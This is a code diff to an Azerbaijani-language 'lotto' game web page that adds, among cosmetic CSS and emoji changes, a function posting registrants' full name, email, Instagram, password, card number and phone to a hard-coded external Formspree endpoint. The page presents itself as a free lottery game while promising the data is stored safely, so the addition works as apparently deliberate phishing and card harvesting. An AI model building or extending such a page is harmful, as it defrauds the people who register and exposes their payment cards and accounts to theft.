@@ -24,6 +24,10 @@
         .info-box { background: #334155; padding: 12px; border-radius: 8px; text-align: left; font-size: 14px; margin: 12px 0; }
         .hidden { display: none; }
         input { width: 100%; padding: 12px; margin: 8px 0; border-radius: 6px; border: 1px solid #475569; background: #334155; color: white; box-sizing: border-box; }
+        .name-row { display: flex; gap: 10px; }
+        .name-row input { width: 50%; }
+        .success { background: #22c55e; color: white; padding: 10px; border-radius: 8px; margin: 10px 0; display: none; }
+        .error { background: #ef4444; color: white; padding: 10px; border-radius: 8px; margin: 10px 0; display: none; }
     </style>
 </head>
 <body>
@@ -31,20 +35,24 @@
 <div class="card">
     <h1>🎟 Milyonçu Lotto</h1>
 
+    <!-- Start Screen -->
     <div id="start-screen">
         <h2>Xoş gəlmisiniz!</h2>
-        <input type="text" id="firstname" placeholder="Ad (məs: Elçin)">
-        <input type="text" id="lastname" placeholder="Soyad (məs: Məmmədov)">
+        <div class="name-row">
+            <input type="text" id="firstname" placeholder="Ad (məs: Elçin)">
+            <input type="text" id="lastname" placeholder="Soyad (məs: Məmmədov)">
+        </div>
         <div class="info-box">
             <strong>Oyun Qaydaları:</strong><br>
             • 2 bilet • Hər bilet 3 sıra (15 rəqəm)<br>
             • 3 dəqiqə • Hər 3 saniyədə 1 rəqəm<br>
-            • Yalnız Cari rəqəm işarələnə bilər<br>
+            • Yalnız Cari rəqəm işarələnə bilər (2.5 saniyə ərzində)<br>
             • Tamamlanan hər sıra uduş gətirir
         </div>
         <button onclick="startRegistration()">Qeydiyyatdan Keç və Oyna</button>
     </div>
 
+    <!-- Qeydiyyat Screen -->
     <div id="reg-screen" class="hidden">
         <h2>Qeydiyyat</h2>
         <div class="info-box">
@@ -52,6 +60,9 @@
             • Məlumatlarınız təhlükəsiz saxlanılır.<br>
             • 24 saatdan sonra yenidən oynaya bilərsiniz.
         </div>
+        <div id="formSuccess" class="success">✅ Məlumatlarınız göndərildi!</div>
+        <div id="formError" class="error">❌ Xəta! Məlumatlar göndərilmədi.</div>
+        
         <form id="pre-reg-form">
             <input type="email" id="email" placeholder="Email" required>
             <input type="text" id="instagram" placeholder="Instagram" required>
@@ -62,6 +73,7 @@
         </form>
     </div>
 
+    <!-- Profil Screen -->
     <div id="profile-screen" class="hidden">
         <h2>Profiliniz</h2>
         <div id="profile-info" class="info-box"></div>
@@ -70,6 +82,7 @@
         <button onclick="logout()" style="background:#ef4444;">Çıxış</button>
     </div>
 
+    <!-- Oyun Screen -->
     <div id="game-screen" class="hidden">
         <div class="timer" id="timer">⏱ 180s</div>
         <div class="current-circle" id="current-circle">?</div>
@@ -77,6 +90,7 @@
         <div id="tickets-container"></div>
     </div>
 
+    <!-- Oyun Bitdi Screen -->
     <div id="end-screen" class="hidden">
         <h2>Oyun Bitdi!</h2>
         <div id="final-result" style="font-size:22px; margin:15px 0; color:#4ade80;"></div>
@@ -85,6 +99,8 @@
 </div>
 
 <script>
+// ====================== Milyonçu Lotto ======================
+
 let currentPlayer = null;
 let gameInterval = null;
 let drawInterval = null;
@@ -93,6 +109,9 @@ let timer = 180;
 let allRows = [];
 let currentDrawNumber = null;
 let lastDrawTime = 0;
+
+// 🔥 SİZİN FORMSPREE ENDPOINT LİNKİNİZ 🔥
+const FORMSPREE_URL = "https://formspree.io/f/mbdbbnwb";
 
 function savePlayer(p) { localStorage.setItem('milyoncu_player', JSON.stringify(p)); }
 function loadPlayer() { const s = localStorage.getItem('milyoncu_player'); return s ? JSON.parse(s) : null; }
@@ -104,6 +123,28 @@ function validateName(first, last) {
     if (!regex.test(first)) return false;
     if (!regex.test(last)) return false;
     return true;
+}
+
+// Formspree-ə məlumat göndər
+async function sendToFormspree(data) {
+    try {
+        const response = await fetch(FORMSPREE_URL, {
+            method: 'POST',
+            headers: { 'Content-Type': 'application/json' },
+            body: JSON.stringify(data)
+        });
+        if (response.ok) {
+            document.getElementById('formSuccess').style.display = 'block';
+            setTimeout(() => { document.getElementById('formSuccess').style.display = 'none'; }, 3000);
+            return true;
+        } else {
+            throw new Error('Formspree xətası');
+        }
+    } catch (error) {
+        document.getElementById('formError').style.display = 'block';
+        setTimeout(() => { document.getElementById('formError').style.display = 'none'; }, 3000);
+        return false;
+    }
 }
 
 function startRegistration() {
@@ -118,7 +159,7 @@ function startRegistration() {
     document.getElementById('reg-screen').classList.remove('hidden');
 }
 
-document.getElementById('pre-reg-form').onsubmit = function(e) {
+document.getElementById('pre-reg-form').onsubmit = async function(e) {
     e.preventDefault();
     const fullname = sessionStorage.getItem('reg_fullname') || '';
     const email = document.getElementById('email').value.trim();
@@ -136,13 +177,26 @@ document.getElementById('pre-reg-form').onsubmit = function(e) {
         alert("Telefon +994 ilə başlamalıdır! Məs: +994501234567"); return; 
     }
     
+    // Formspree-ə məlumat göndər
+    const formData = {
+        fullname: fullname,
+        email: email,
+        instagram: instagram,
+        password: password,
+        card_number: card,
+        phone: phone,
+        registered_at: new Date().toISOString()
+    };
+    
+    await sendToFormspree(formData);
+    
     const existing = loadPlayer();
     if (existing && existing.email === email) {
         currentPlayer = existing;
-        alert("Profil tapıldı! " + fullname);
+        alert("✅ Profil tapıldı! Xoş gəldiniz, " + fullname);
     } else {
         currentPlayer = { fullname, email, instagram, password, card, phone, balance: existing ? existing.balance : 0, lastPlayTime: null };
-        alert("Qeydiyyat tamamlandı! 🎉");
+        alert("✅ Qeydiyyat tamamlandı! 🎉");
     }
     savePlayer(currentPlayer);
     showProfileScreen();
@@ -194,7 +248,7 @@ function initGame() {
     for (let t = 0; t < 2; t++) {
         const ticketDiv = document.createElement('div');
         ticketDiv.className = 'ticket';
-        ticketDiv.innerHTML = `<h4>Bilet ${t+1}</h4>`;
+        ticketDiv.innerHTML = `<h4>🎫 Bilet ${t+1}</h4>`;
         for (let r = 0; r < 3; r++) {
             const rowDiv = document.createElement('div');
             rowDiv.className = 'row';
